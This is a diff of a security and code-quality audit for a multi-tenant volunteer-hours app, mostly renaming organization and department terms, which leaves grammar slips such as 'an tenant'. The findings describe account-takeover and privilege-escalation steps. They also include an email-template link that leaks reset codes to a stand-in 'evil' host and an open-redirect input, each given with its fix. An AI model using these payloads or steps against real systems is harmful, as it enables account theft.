@@ -34,8 +34,8 @@ Each item has an ID (`SEC-`, `PERF-`, `A11Y-`, `TEST-`, `DUP-`, `DOC-`, `BP-` fo
 
 ## Executive summary
 
-- **The most urgent problem is a complete account-takeover chain that needs no existing privileges.** Anyone can sign up, create an organization, add an existing user (a SuperAdmin included) by email, rewrite that user's global login email, and reset their password. Five more High security issues make takeover or privilege escalation easy: brute-forceable 6-digit reset and invite codes with no rate limit, tenant-controlled reset emails, cross-org department grants, and self-promoting roles.
-- **Tenant isolation is mostly solid at the query level.** Foreign keys are checked against the org almost everywhere. It leaks in four places: access-request department IDs, the global `UserProfile` being edited as if it belonged to one org, Blob asset paths, and feedback submitted into other orgs. Fine-grained permissions are mostly enforced only in the UI.
+- **The most urgent problem is a complete account-takeover chain that needs no existing privileges.** Anyone can sign up, create an tenant, add an existing user (a SuperAdmin included) by email, rewrite that user's global login email, and reset their password. Five more High security issues make takeover or privilege escalation easy: brute-forceable 6-digit reset and invite codes with no rate limit, tenant-controlled reset emails, cross-org organization grants, and self-promoting roles.
+- **Tenant isolation is mostly solid at the query level.** Foreign keys are checked against the org almost everywhere. It leaks in four places: access-request organization IDs, the global `UserProfile` being edited as if it belonged to one org, Blob asset paths, and feedback submitted into other orgs. Fine-grained permissions are mostly enforced only in the UI.
 - **Production likely has a hang in clock-out (verify).** The Prisma pool is capped at **1 connection** on Prisma Postgres, and several transactions call the global client while holding that one connection. Those calls deadlock until the 5 s transaction timeout.
 - **The HTTP contract suite is good but never runs in CI.** Pull requests run no lint, typecheck, HTTP tests, or coverage. Tenant-isolation tests mostly use a user with no org, not an admin of another org.
 - **Accessibility has three Critical issues.** Error toasts are about 1.1:1 contrast. The report designer has no keyboard path. Clickable table rows have no keyboard path. There are also many unlabeled form controls and no landmarks or skip link.
@@ -49,17 +49,17 @@ Each item has an ID (`SEC-`, `PERF-`, `A11Y-`, `TEST-`, `DUP-`, `DOC-`, `BP-` fo
 ### SEC-01 — Account takeover through org-scoped email and profile edits · Security, tenant isolation · M · [BAD-128](https://linear.app/baddley/issue/BAD-128)
 
 > **Status: done (12 Nov 2026), on `staging`.** What shipped:
-> - `POST /organizations/{id}/memberships` always creates a new account. An email that already has an account gets 409 `account_exists` and is told to send an invitation; existing accounts join only by accepting an invite. This differs from fix step 2, which proposed creating the invitation automatically.
-> - `PATCH` on a membership changes the email or global profile only while no other organization shares the person and they aren't a SuperAdmin. The email additionally needs an account the person has never signed in to (`mustChangePassword` true). Re-sending a field's current value isn't a change, so the edit form still works. Verified email changes (fix step 3) come with SEC-04.
-> - Import "merge" only touches people already in the organization, and updates names only on accounts no other organization shares.
+> - `POST /tenants/{id}/memberships` always creates a new account. An email that already has an account gets 409 `account_exists` and is told to send an invitation; existing accounts join only by accepting an invite. This differs from fix step 2, which proposed creating the invitation automatically.
+> - `PATCH` on a membership changes the email or global profile only while no other tenant shares the person and they aren't a SuperAdmin. The email additionally needs an account the person has never signed in to (`mustChangePassword` true). Re-sending a field's current value isn't a change, so the edit form still works. Verified email changes (fix step 3) come with SEC-04.
+> - Import "merge" only touches people already in the tenant, and updates names only on accounts no other tenant shares.
 > - Tests: a new takeover regression test in `tests/http/memberships.test.mjs`, a merge test in `imports.test.mjs`, and a `joinOrg` (invite then accept) helper that the other test files now use for setup.
 
 - **Where:**
   - `src/lib/api/features/memberships.ts` 403–424: adding an existing user by email overwrites their global `UserProfile`.
   - `src/lib/api/features/memberships.ts` 541–546: `updateOrgMembership` writes `User.email`.
   - `src/lib/api/features/imports.ts` 239–273: the person-import "merge" path does the same.
-  - `src/lib/api/features/organizations.ts` 318–342: any signed-in user can create an org and becomes its ADMIN.
-- **Problem:** `users.ts` 157–159 correctly blocks changing `email`, `username`, `password` and `isSuperAdmin` for other people, but the membership path skips that guard. The attack takes six steps: sign up, create an org, `POST /organizations/{id}/memberships` with the victim's email, `PATCH` the membership with `email: attacker@…`, use forgot-password, then log in. An org-admin API key works too.
+  - `src/lib/api/features/tenants.ts` 318–342: any signed-in user can create an org and becomes its ADMIN.
+- **Problem:** `users.ts` 157–159 correctly blocks changing `email`, `username`, `password` and `isSuperAdmin` for other people, but the membership path skips that guard. The attack takes six steps: sign up, create an org, `POST /tenants/{id}/memberships` with the victim's email, `PATCH` the membership with `email: attacker@…`, use forgot-password, then log in. An org-admin API key works too.
 - **Fix:**
   1. Org-scoped endpoints must never write `User.email`, `User.username`, or global profile fields for a user who already exists, or who belongs to any other org.
   2. Adding an existing user by email creates an **invitation** that the user must accept, not a membership.
@@ -69,13 +69,13 @@ Each item has an ID (`SEC-`, `PERF-`, `A11Y-`, `TEST-`, `DUP-`, `DOC-`, `BP-` fo
 ### SEC-02 — Tenant-edited password-reset template can steal reset codes · Security · S–M · [BAD-129](https://linear.app/baddley/issue/BAD-129)
 
 > **Status: done (12 Nov 2026), on `staging`.** What shipped:
-> - A password reset on a tenant host uses that organization's template and address only when the person is an active member there.
+> - A password reset on a tenant host uses that tenant's template and address only when the person is an active member there.
 > - Email links must be a fixed URL with no fields in it, or exactly one field (for example `{{reset.url}}`). Anything else, such as `https://evil/?c={{reset.code}}`, loses its href. The rule runs when a template is saved and again when each email is sent, so templates saved earlier are covered.
 > - Not done: locking the PasswordReset, Invite and Welcome bodies to platform copy (fix step 2). With the link rule in place, an admin can no longer make the code leave the email automatically. Revisit if social-engineering copy becomes a concern.
 > - Tests: sanitizer and send-time unit tests in `tests/email-template.test.ts`, and an HTTP test in `tests/http/auth.test.mjs` for member vs non-member resets on a tenant.
 
 - **Where:**
-  - `src/lib/api/features/auth.ts` 192–210 (`resetOrganization` picks the pinned tenant even for non-members) and 250–256.
+  - `src/lib/api/features/auth.ts` 192–210 (`resetTenant` picks the pinned tenant even for non-members) and 250–256.
   - `src/lib/email/templates.ts` 296–297 and 351–353 (`{{reset.code}}` is substituted inside `href`).
   - `src/lib/api/features/email-templates.ts` 138–141.
 - **Problem:** An attacker creates an org with a slug and edits the PasswordReset template to `<a href="https://evil/?c={{reset.code}}">`. They then request a reset for any email on their subdomain. The victim gets a genuine platform email that carries a valid code to the attacker.
@@ -118,7 +118,7 @@ Each item has an ID (`SEC-`, `PERF-`, `A11Y-`, `TEST-`, `DUP-`, `DOC-`, `BP-` fo
 > - Wrong codes are rate limited: 10 per account and 30 per IP in 15 minutes. The signup page's pre-login invite lookup shares the IP limit.
 > - Pre-login invite details (fix step 2) now need a code that can't be guessed, so they stay as a convenience for the real invitee.
 > - Not in this change: email verification on sign-up and email change, the current-password check on email change, and gating `linkGuest` on a verified email (fix steps 3–4). They need a new verification flow with web and mobile UI, now tracked as SEC-04b.
-> - Tests: `tests/invite-code.test.ts`, and a new HTTP test in `tests/http/invitations.test.mjs` for typed variants and the accept limit. The stale tenant test in `organizations.test.mjs` now passes and checks the new code format in invite links.
+> - Tests: `tests/invite-code.test.ts`, and a new HTTP test in `tests/http/invitations.test.mjs` for typed variants and the accept limit. The stale tenant test in `tenants.test.mjs` now passes and checks the new code format in invite links.
 
 - **Where:**
   - `src/lib/api/security.ts` 20–33 (6-digit codes valid for 7 days).
@@ -138,39 +138,39 @@ Each item has an ID (`SEC-`, `PERF-`, `A11Y-`, `TEST-`, `DUP-`, `DOC-`, `BP-` fo
   4. Require the current password to change email.
 - **Tests:** an unauthenticated invite lookup returns no PII. An unverified account cannot accept an invite.
 
-### SEC-05 — Access-request approval grants department admin in other orgs · Tenant isolation · S · [BAD-132](https://linear.app/baddley/issue/BAD-132)
+### SEC-05 — Access-request approval grants organization admin in other orgs · Tenant isolation · S · [BAD-132](https://linear.app/baddley/issue/BAD-132)
 
 > **Status: done (12 Nov 2026), on `staging`.** What shipped:
-> - On creation, `requestedDepartmentIds` must be valid ids of departments in that organization, and `volunteerNeedId` must be one of its needs; anything else gets 400.
-> - Approval filters again, so requests stored before this fix can't grant foreign departments.
-> - The role change and department grants now run in one transaction.
-> - Test in `tests/http/voluntime-feedback.test.mjs`: a cross-org request is refused, and a planted legacy request with a foreign department grants nothing when approved.
+> - On creation, `requestedOrganizationIds` must be valid ids of organizations in that tenant, and `volunteerNeedId` must be one of its needs; anything else gets 400.
+> - Approval filters again, so requests stored before this fix can't grant foreign organizations.
+> - The role change and organization grants now run in one transaction.
+> - Test in `tests/http/voluntime-feedback.test.mjs`: a cross-org request is refused, and a planted legacy request with a foreign organization grants nothing when approved.
 
-- **Where:** `src/lib/api/features/access-requests.ts` 70–80 (parse), 112–122 (stored without checks), and 222–231 (approval upserts `DepartmentMembership` with role ADMIN for every ID).
-- **Problem:** A volunteer in org B creates org A, files an access request in A listing B's department IDs, and approves it themselves. They become a department ADMIN in org B.
+- **Where:** `src/lib/api/features/access-requests.ts` 70–80 (parse), 112–122 (stored without checks), and 222–231 (approval upserts `OrganizationMembership` with role ADMIN for every ID).
+- **Problem:** A volunteer in org B creates org A, files an access request in A listing B's organization IDs, and approves it themselves. They become a organization ADMIN in org B.
 - **Fix:**
-  1. At creation **and** at approval, keep only UUIDs where `department.organizationId === row.organizationId`.
+  1. At creation **and** at approval, keep only UUIDs where `organization.tenantId === row.tenantId`.
   2. Validate `volunteerNeedId` the same way.
   3. Run approval in a transaction.
-- **Tests:** a foreign department ID is rejected with 400 at creation and ignored at approval.
+- **Tests:** a foreign organization ID is rejected with 400 at creation and ignored at approval.
 
 ### SEC-06 — Privilege escalation through roles, self-approval and import · Security · M · [BAD-133](https://linear.app/baddley/issue/BAD-133)
 
 > **Status: done (12 Nov 2026), on `staging`.** What shipped:
-> - A shared rule, `assertCanGrant` in `roles.ts`: anyone but an organization admin can grant only permissions they hold, and no wider scope than their own.
+> - A shared rule, `assertCanGrant` in `roles.ts`: anyone but an tenant admin can grant only permissions they hold, and no wider scope than their own.
 > - It applies when creating a role, and when editing one (only newly added permissions and a changed scope are checked, so renames still work).
 > - It applies to the role an access-request approval would give.
 > - It applies to each role in a people import. An importer gets the new accounts' passwords, so a row whose role the importer couldn't grant becomes a row error.
-> - Nobody can review their own access request, and granting group-manager rights through a request needs an organization admin.
+> - Nobody can review their own access request, and granting group-manager rights through a request needs an tenant admin.
 > - Deferred: removing temporary passwords from import responses (fix step 4). Admins use them to hand out accounts, so this needs the email-a-link flow first.
 > - Test in `tests/http/voluntime-feedback.test.mjs` covering all three routes. Also fixed the stale reserved-username test in that file.
 
 - **Where:**
-  - `src/lib/api/features/roles.ts` 157–200: a `manage_roles` holder can add `manage_organization` to their own role.
+  - `src/lib/api/features/roles.ts` 157–200: a `manage_roles` holder can add `manage_tenant` to their own role.
   - `src/lib/api/features/access-requests.ts` 103–104 and 217–221: anyone can request ADMIN, and someone holding `approve_access_requests` can approve their own request.
   - `src/lib/api/features/imports.ts` 210–212 and 285–290: `import_people` can create ADMIN accounts and returns their temporary passwords.
 - **Fix:**
-  1. A caller may grant only permissions and roles they already hold. Granting ADMIN or `manage_organization` requires `manage_organization`.
+  1. A caller may grant only permissions and roles they already hold. Granting ADMIN or `manage_tenant` requires `manage_tenant`.
   2. Block approving your own request.
   3. Restrict which roles an import can assign.
   4. Never return passwords in API responses; email a set-password link instead.
@@ -191,7 +191,7 @@ Each item has an ID (`SEC-`, `PERF-`, `A11Y-`, `TEST-`, `DUP-`, `DOC-`, `BP-` fo
   - Global `prisma.*` calls inside `transaction()`:
     - `src/lib/api/features/time-entries.ts` 1017–1019 and 1038 (`clockOut`: `assertProject`, `assertTaskCategory`, `tagIdsFor`)
     - `time-entries.ts` 1102 and 1120 (`cancelClock`, `resetClock`)
-    - `src/lib/api/features/volunteer-needs.ts` 688 and 717 (`access.requireOrganization` inside the transaction)
+    - `src/lib/api/features/volunteer-needs.ts` 688 and 717 (`access.requireTenant` inside the transaction)
   - `memberships.ts` 363–364 already has a comment documenting this rule.
 - **Problem:** `@prisma/adapter-pg` checks out the only connection for the transaction. Any global-client call inside the callback then waits for that same connection until Prisma's 5 s timeout (P2028). For example, the header "Stop timer" on an entry with a project likely fails in production but works locally, where the pool is normal size.
 - **Verify:** search staging and production logs for `P2028` or "Transaction already closed", and reproduce clock-out with a project on staging.
@@ -242,7 +242,7 @@ Each item has an ID (`SEC-`, `PERF-`, `A11Y-`, `TEST-`, `DUP-`, `DOC-`, `BP-` fo
 Split out of SEC-04. The app never checks that a person controls their account's email:
 
 - Sign-up and self-service email changes need no verification, and no password for the change.
-- `linkGuest` hands an account every guest volunteer sign-up made with that email, across organizations.
+- `linkGuest` hands an account every guest volunteer sign-up made with that email, across tenants.
 - Sign-up reveals whether an email already has an account.
 - Org admins can't fix the email on an account they created once the person has signed in.
 
@@ -257,42 +257,42 @@ Split out of SEC-04. The app never checks that a person controls their account's
 #### SEC-07 — Every member can read all members' emails and pay rates · S · [BAD-136](https://linear.app/baddley/issue/BAD-136)
 
 > **Status: done (12 Nov 2026), on `staging`.** What shipped:
-> - Both member lists (organization and department) null out other members' `user.email` unless the caller has `manage_members` or `invite_members`, which covers admins and group managers.
+> - Both member lists (tenant and organization) null out other members' `user.email` unless the caller has `manage_members` or `invite_members`, which covers admins and group managers.
 > - They null out `rateType` and `professionalBillingRate` unless the caller has `manage_members`.
 > - Your own row always shows everything.
 > - Web and mobile types now allow a null email, and the mobile list falls back to the username.
 > - Test: `tests/http/memberships.test.mjs`.
 
-`listOrgMemberships` (`src/lib/api/features/memberships.ts` 304–322) only calls `requireOrganization(id, false)` but returns `user.email`, `rateType` and `professionalBillingRate`.
+`listOrgMemberships` (`src/lib/api/features/memberships.ts` 304–322) only calls `requireTenant(id, false)` but returns `user.email`, `rateType` and `professionalBillingRate`.
 
 **Fix:** require `manage_members` or admin for the full view, and return a trimmed directory view to everyone else. The web people picker and the mobile app need updating to match.
 
 #### SEC-08 — A global `UserProfile` is edited per org, so private notes leak between orgs · M · [BAD-137](https://linear.app/baddley/issue/BAD-137)
 
 > **Status: done (12 Nov 2026), on `staging`.** What shipped:
-> - New `OrganizationMembership.notes` (migration `20261113030000_membership_notes`, applied to staging and production). Member create, member patch and people import write `notes` there, and member lists show it only to `manage_members` holders.
-> - Profile `notes` are now written only by the person. Admins of the person's organizations can still read them, as the existing privacy tests intend (for example an allergy).
+> - New `TenantMembership.notes` (migration `20261113030000_membership_notes`, applied to staging and production). Member create, member patch and people import write `notes` there, and member lists show it only to `manage_members` holders.
+> - Profile `notes` are now written only by the person. Admins of the person's tenants can still read them, as the existing privacy tests intend (for example an allergy).
 > - SEC-01 already stops admins editing the rest of a shared person's profile. Phone and ZIP stay global contact details.
 > - Existing profile notes were not moved, because there's no record of who wrote them.
-> - The mobile edit sheet now loads and saves the organization note, and no longer wipes the person's phone on every save.
+> - The mobile edit sheet now loads and saves the tenant note, and no longer wipes the person's phone on every save.
 > - Test: `tests/http/memberships.test.mjs`.
 
 - **Where:** writes in `memberships.ts` 409–423 and 548–572; reads in `users.ts` 117–137.
 - **Problem:** Org admins edit `notes`, `phone`, `zipCode`, `description` and `avatarUrl` on the global profile. Org A's admin can overwrite them, and can read org B's private notes about a shared person.
-- **Fix:** move org-specific notes, phone overrides and description onto `OrganizationMembership`. Only the user edits their global profile.
+- **Fix:** move org-specific notes, phone overrides and description onto `TenantMembership`. Only the user edits their global profile.
 
 #### SEC-09 — Cross-org Blob delete and read through `orgs/…` paths · S · [BAD-138](https://linear.app/baddley/issue/BAD-138)
 
 > **Status: done (12 Nov 2026), on `staging`.** What shipped:
 > - New `isOwnedBrandBlob` and `isOwnedAvatarBlob` in `src/lib/brand.ts`: a Blob path must sit under `orgs/<thisOrgId>/` or `avatars/<userId>/`.
-> - Organization updates reject brand URLs pointing at another organization's Blob file.
+> - Tenant updates reject brand URLs pointing at another tenant's Blob file.
 > - Profile and membership updates reject an avatar URL that isn't that person's. A new member's avatar can't be a Blob file at all.
 > - Brand deletes, brand reads and avatar reads only touch owned paths.
 > - Tests: `tests/blob-ownership.test.ts`, plus new cases in `tests/http/brand.test.mjs` and `avatar.test.mjs`.
 
 - **Where:**
   - `src/lib/brand.ts` 132–139 (`isVercelBlobUrl` accepts any `orgs/` prefix).
-  - `src/lib/api/features/organizations.ts` 176–187 (brand URLs accept any string).
+  - `src/lib/api/features/tenants.ts` 176–187 (brand URLs accept any string).
   - `src/lib/api/features/brand.ts` 24–42.
   - `src/lib/server/brand-assets.ts` 108–111.
   - `src/app/avatar/[userId]/route.ts` 31.
@@ -304,8 +304,8 @@ Split out of SEC-04. The app never checks that a person controls their account's
 > **Status: done for the gaps that were looser than the UI (12 Nov 2026), on `staging`.** What shipped:
 > - Reports: a caller without `view_reports` gets only their own hours, so volunteer dashboards still work.
 > - `time-entries.csv` and `summary.csv` now require `export_reports`, as `view.csv` already did.
-> - Creating a project requires `create_projects`, scoped to the department for Department projects. Previously any member could.
-> - Lists, members and API keys already require an organization admin, which is stricter than `manage_lists`, `manage_members` and `manage_api_keys`. Letting non-admin holders of those permissions in is part of DUP-02's shared gates.
+> - Creating a project requires `create_projects`, scoped to the organization for Organization projects. Previously any member could.
+> - Lists, members and API keys already require an tenant admin, which is stricter than `manage_lists`, `manage_members` and `manage_api_keys`. Letting non-admin holders of those permissions in is part of DUP-02's shared gates.
 > - Tests: a new role-permissions test in `tests/http/voluntime-feedback.test.mjs`. The project tests now give their member a role with `create_projects`, because default Staff never had it in the UI.
 
 - **Where:**
@@ -321,8 +321,8 @@ Split out of SEC-04. The app never checks that a person controls their account's
 
 > **Status: done (12 Nov 2026), on `staging`.** What shipped:
 > - People can still read their own entries after leaving, but changing or deleting them needs an active membership.
-> - Entries someone logged for another person no longer grant lasting access: they also need an active membership and `log_member_time` (department-scoped).
-> - Admin, department-admin and connection access are unchanged.
+> - Entries someone logged for another person no longer grant lasting access: they also need an active membership and `log_member_time` (organization-scoped).
+> - Admin, organization-admin and connection access are unchanged.
 > - New `Access.isActiveMember`.
 > - Test: `tests/http/time.test.mjs`.
 
@@ -333,13 +333,13 @@ The `owned` check (`time-entries.ts` 578–602) and delete (963–966) grant acc
 #### SEC-12 — Feedback can be sent into any org · S · [BAD-141](https://linear.app/baddley/issue/BAD-141)
 
 > **Status: done (12 Nov 2026), on `staging`.** What shipped:
-> - Off a tenant host, sending feedback to an organization now needs an active membership there (`requireOrganization(organizationId, false)`), so outsiders can't trigger its notification emails or learn its name.
-> - Feedback to VolunTime itself (no organization) is unchanged.
+> - Off a tenant host, sending feedback to an tenant now needs an active membership there (`requireTenant(tenantId, false)`), so outsiders can't trigger its notification emails or learn its name.
+> - Feedback to VolunTime itself (no tenant) is unchanged.
 > - Test: `tests/http/feedback.test.mjs`.
 
-`feedback.ts` 352–365: off a tenant host, `organizationId` is only checked for existence. This sends that org's notification emails and returns its name for any UUID.
+`feedback.ts` 352–365: off a tenant host, `tenantId` is only checked for existence. This sends that org's notification emails and returns its name for any UUID.
 
-**Fix:** `requireOrganization(organizationId, false)`.
+**Fix:** `requireTenant(tenantId, false)`.
 
 #### SEC-13 — No security headers · S · [BAD-142](https://linear.app/baddley/issue/BAD-142)
 
@@ -398,7 +398,7 @@ Add `tests/http/tenant-isolation.test.mjs`:
 1. Build the route list from `src/lib/developer/openapi.json`.
 2. Seed org A with one of every resource, and org B with an admin, a volunteer and an API key.
 3. For every `{id}` route, call it with org B's credentials and org A's IDs, and assert 403 or 404. Include the mismatched-parent case: org B in the path with an org A child ID.
-4. For every create and update, inject org A's `projectId`, `taskCategoryId`, `departmentId`, `hourlyRateId`, `tagIds`, `roleId` and `requestedDepartmentIds`, and assert 400.
+4. For every create and update, inject org A's `projectId`, `taskCategoryId`, `organizationId`, `hourlyRateId`, `tagIds`, `roleId` and `requestedOrganizationIds`, and assert 400.
 5. Fail when a route has no matrix entry, so new routes are covered by default.
 6. Cover MCP too: a read-only key calling a write tool, and a cross-org call.
 
@@ -549,7 +549,7 @@ Highlight (#D4AC59) and success (#4EBFAE) used as text reach only about 2.1:1:
   - An empty `catch {}` in `feedback.ts:260`.
   - `mail.ts` 110–115 drops the response status and body.
   - `respond.ts` 19–23 and `server/action.ts` 12–14 log only errors that aren't `ApiError`.
-- **Fix:** log the status and body in `mail.ts`, and add a `sendEmailBestEffort()` helper that logs `{ for, organizationId }`. Move sends into `after()` and add `AbortSignal.timeout(5000)` to the Resend, Linear and Turnstile fetches (see PERF-07).
+- **Fix:** log the status and body in `mail.ts`, and add a `sendEmailBestEffort()` helper that logs `{ for, tenantId }`. Move sends into `after()` and add `AbortSignal.timeout(5000)` to the Resend, Linear and Turnstile fetches (see PERF-07).
 
 #### OPS-02 — Environment variables aren't validated · S–M · [BAD-153](https://linear.app/baddley/issue/BAD-153)
 
@@ -609,12 +609,12 @@ Ordered by impact. Each item names the new abstraction and where it should live.
 | DUP-08 [BAD-171](https://linear.app/baddley/issue/BAD-171) | Log and entries lists: day grouping (3 copies), day header card (3), "Load more" (3), optimistic removal from an infinite query (2), card titles with an icon (4), and "edit this item" dialog state (16 uses) | `groupByDay()`, `<DayGroup>`, `<LoadMoreButton>`, `removeFromInfinite()`, `useDialogTarget<T>()`, `<IconCardTitle>` | M |
 | DUP-09 [BAD-172](https://linear.app/baddley/issue/BAD-172) | Feedback mutation setup copied 7 times (`feedback-view.tsx`, `feedback-detail.tsx`); `formatWhen` twice | `useFeedbackMutation()`, `readFeedbackUpdate()` | S |
 | DUP-10 [BAD-173](https://linear.app/baddley/issue/BAD-173) | Query keys and fetchers inline instead of in `keys`: roles (2 places, with different types), access requests, unclassified count, payroll. Action results unwrapped by hand. `FormMessage` built from a mutation's error 6 times | Add them to `keys` and the `*Query` factories; `unwrap()`, `<MutationMessage>`, `useFlatInfinite()` | M |
-| DUP-11 [BAD-174](https://linear.app/baddley/issue/BAD-174) | Tags, task categories and departments feature modules are about 80% identical; "delete fails if time entries reference it" repeated 5 times; date-order checks twice; name-uniqueness checks 3 times; a looser UUID regex in `volunteer-needs.ts:120` | `features/shared.ts` (`assertNoTimeEntries`, `loadOwned`, `assertDateOrder`, `assertUniqueName`), with an optional `namedLookupFeature()` factory | M |
+| DUP-11 [BAD-174](https://linear.app/baddley/issue/BAD-174) | Tags, task categories and organizations feature modules are about 80% identical; "delete fails if time entries reference it" repeated 5 times; date-order checks twice; name-uniqueness checks 3 times; a looser UUID regex in `volunteer-needs.ts:120` | `features/shared.ts` (`assertNoTimeEntries`, `loadOwned`, `assertDateOrder`, `assertUniqueName`), with an optional `namedLookupFeature()` factory | M |
 | DUP-12 [BAD-175](https://linear.app/baddley/issue/BAD-175) | `projects-card`, `api-keys-view`, `hourly-rates-card` and `invite-card` each rebuild `LookupListCard` | `<EntityListCard>` and `<EntityRow>`; rebuild `LookupListCard` on top | M |
 | DUP-13 [BAD-176](https://linear.app/baddley/issue/BAD-176) | Near-identical section shells (`settings-shell`, `people-shell`, `developer-shell`); `EditorLayout` duplicates `SectionLayout` without the nav; `need-detail` shows two titles on mobile; `about-prototype` hand-rolls its `h1` | `<GatedSectionShell>`, an optional `nav` on `SectionLayout`, a `title` override on `PageHeader`, and a `<SectionHeading>` component | S |
 | DUP-14 [BAD-177](https://linear.app/baddley/issue/BAD-177) | Plumbing repeated across REST, actions and MCP: 76 copies of `const access = await requireAccess()`, 134 `authenticate()` calls, 5 MCP `page` schemas, 12 `return "deleted"` | `runWithAccess()`, `authed()`, a shared MCP `page`, `registerNamedLookupTools()` | M |
 | DUP-15 [BAD-178](https://linear.app/baddley/issue/BAD-178) | Small utilities: query-string builders (8 or more), date, UUID and email regexes (6, 5 and 3 copies), clipboard copy with a toast, synced draft state | `lib/search-params.ts`, `lib/patterns.ts`, `copyToClipboard()`, `useSyncedDraft()` | S |
-| DUP-16 [BAD-179](https://linear.app/baddley/issue/BAD-179) | Test fixtures: org setup in 25 HTTP test files, report-card fixtures in 6, and near-identical tags, categories and departments tests | `createOrgFixture()`, `tests/fixtures/report-cards`, `describeNamedLookup()` | M |
+| DUP-16 [BAD-179](https://linear.app/baddley/issue/BAD-179) | Test fixtures: org setup in 25 HTTP test files, report-card fixtures in 6, and near-identical tags, categories and organizations tests | `createOrgFixture()`, `tests/fixtures/report-cards`, `describeNamedLookup()` | M |
 
 Places that reimplement the display-name rule (DUP-03):
 
@@ -638,7 +638,7 @@ Places that reimplement the display-name rule (DUP-03):
   - **Where:** `mail.ts` 38–109, `actions/entries.ts` 51–87, `feedback.ts` 322–388, `volunteer-needs.ts` 740–748, `access-requests.ts` 183–200.
   - **Problem:** in `access-requests.ts`, the decision is saved before the email is sent, so a failed email shows an error even though the decision stuck.
   - **Fix:** send from `after()`, use the Resend batch API, and load each template once per batch.
-- **PERF-08 — Over-broad cache invalidation · S.** [BAD-183](https://linear.app/baddley/issue/BAD-183) `use-clock.ts:13` invalidates `["org"]`, which is every org. `keys.organization(id)` is used for single entries in 7 places, so every clock-in re-runs the 35–40-query report. **Fix:** invalidate only the entry, report and unclassified-count keys.
+- **PERF-08 — Over-broad cache invalidation · S.** [BAD-183](https://linear.app/baddley/issue/BAD-183) `use-clock.ts:13` invalidates `["org"]`, which is every org. `keys.tenant(id)` is used for single entries in 7 places, so every clock-in re-runs the 35–40-query report. **Fix:** invalidate only the entry, report and unclassified-count keys.
 - **PERF-09 — Exports build the whole file in memory with no row limit · M.** [BAD-184](https://linear.app/baddley/issue/BAD-184)
   - **Where:** `reports.ts` 430–452 (CSV) and 515–547 (payroll summed in JavaScript).
   - **Fix:** stream keyset pages through a `ReadableStream`. Compute payroll with `groupBy`, keeping the current per-entry rounding.
@@ -647,7 +647,7 @@ Places that reimplement the display-name rule (DUP-03):
 - **PERF-12 — Missing indexes and an unbounded table · S.** [BAD-187](https://linear.app/baddley/issue/BAD-187) Add these indexes:
   - `VolunteerSignup(volunteerNeedId, createdAt)`
   - a partial index for open timers on `UserTimeEntry(userId) WHERE mode='Punch' AND "endedAt" IS NULL`
-  - `AccessRequest(organizationId, status, createdAt)`
+  - `AccessRequest(tenantId, status, createdAt)`
   - `Feedback(status, createdAt)`
 
   `RefreshToken` rows are never deleted; add a cleanup step to the cron. Set `limitInputPixels` in sharp (`avatar-assets.ts:67`, `brand-assets.ts:59`, `feedback-assets.ts:55`).
@@ -659,7 +659,7 @@ Places that reimplement the display-name rule (DUP-03):
 - **SEC-15 — Possible open redirect after login · S (verify).** [BAD-190](https://linear.app/baddley/issue/BAD-190) `safeNext` (`src/lib/server/action.ts` 30–32) accepts `/\evil.com`. The `/brand` and `/avatar` routes also 302 to arbitrary `https` URLs. **Fix:** reject backslashes and `//`. Serve only Blob assets and never redirect.
 - **SEC-16 — Weak refresh-token reuse detection · M.** [BAD-191](https://linear.app/baddley/issue/BAD-191) `auth.ts` 156–180: reusing a token within 2 minutes silently creates a new session, and later reuse doesn't revoke the token family. **Fix:** store a token family ID, and revoke the whole family on reuse outside the grace window.
 - **SEC-17 — Group-session and need-management scope is too broad · S.** [BAD-192](https://linear.app/baddley/issue/BAD-192)
-  - `collective.ts` 210–231: `updateCollective` checks only the target department, and any member can read any group session.
+  - `collective.ts` 210–231: `updateCollective` checks only the target organization, and any member can read any group session.
   - `volunteer-needs.ts` 316–325 and 627–637: any `create_needs` holder can manage org-wide needs created by others, and published needs can be edited without re-approval. Public sign-up overwrites a guest's name and phone, matched only by email.
 - **SEC-18 — Server-action errors may leak internals · S (verify).** [BAD-193](https://linear.app/baddley/issue/BAD-193) `explain()` in `src/lib/api/errors.ts` 81–104 returns the last line of non-API errors to the client. **Fix:** return a generic message plus a correlation ID, and log the detail on the server.
 
@@ -712,7 +712,7 @@ Places that reimplement the display-name rule (DUP-03):
 - **A11Y-16 — Markdown editor sets every image's alt text to "Image" · S.** [BAD-205](https://linear.app/baddley/issue/BAD-205) `markdown-editor.tsx:160`. Add an alt-text field. Also check **(verify)** that Cmd/Ctrl+B inside TipTap doesn't toggle the sidebar (`sidebar.tsx` 96–110).
 - **A11Y-17 — Mobile app semantics · M.** [BAD-206](https://linear.app/baddley/issue/BAD-206)
   - `FormField` doesn't link its label to the input, and errors aren't announced (`apps/mobile/src/ui.tsx` 250–277).
-  - Department and permission toggles have no `accessibilityRole="checkbox"` or state (`people.tsx` 575–637).
+  - Organization and permission toggles have no `accessibilityRole="checkbox"` or state (`people.tsx` 575–637).
   - Tag chips show selection only by colour (`placement.tsx` 245–253).
 
 ### Best practices
@@ -749,7 +749,7 @@ Places that reimplement the display-name rule (DUP-03):
     - Client: `src/hooks/*`, then `src/lib/queries.ts`, then `fetchJson`, then REST
     - MCP: `src/lib/mcp/tools/*`, then the feature modules
   - The auth model: JWT, cookies only authenticating GET/HEAD, API keys and scopes, MCP.
-  - The tenancy model: subdomains, `pinnedOrganization`, cookie scoping.
+  - The tenancy model: subdomains, `pinnedTenant`, cookie scoping.
   - The permission model: role scopes, `Access.can`, and the gates from DUP-02.
   - Surprising routing: the `(api)` route group at the site root, the `src/app/api/cron` and `(api)/api/feedback` exceptions, `proxy.ts` 84–117 rewriting `/feedback` based on `Accept` and `sec-fetch-dest`, and the `[...slug]` 404 catch-alls.
   - Why the schema uses EF-style `PK_`/`IX_`/`FK_` names, and that `db.ts` 53–70 matches them as substrings, so they must not be renamed.
@@ -759,7 +759,7 @@ Places that reimplement the display-name rule (DUP-03):
   - Missing from `.env.example`: `VERCEL_ENV`, `VERCEL_TARGET_ENV`, `API_BASE_URL`, `MAIL_SINK_URL`/`PORT`, `LINEAR_SINK_URL`/`PORT`, `MIGRATION_TEST_DATABASE_URL`, `BASELINE_REFERENCE_URL`, `E2E_*`, `EXPECTED_SHA`, `VERCEL_AUTOMATION_BYPASS_SECRET`, `CASWJ_ORG_NAME`, and mobile's `EXPO_PUBLIC_*`.
   - Listed but never read: `BLOB_STORE_ID`, and `AZURE_*` (used only by a skill).
 - **DOC-05 — Fix stale docs · S.** [BAD-222](https://linear.app/baddley/issue/BAD-222)
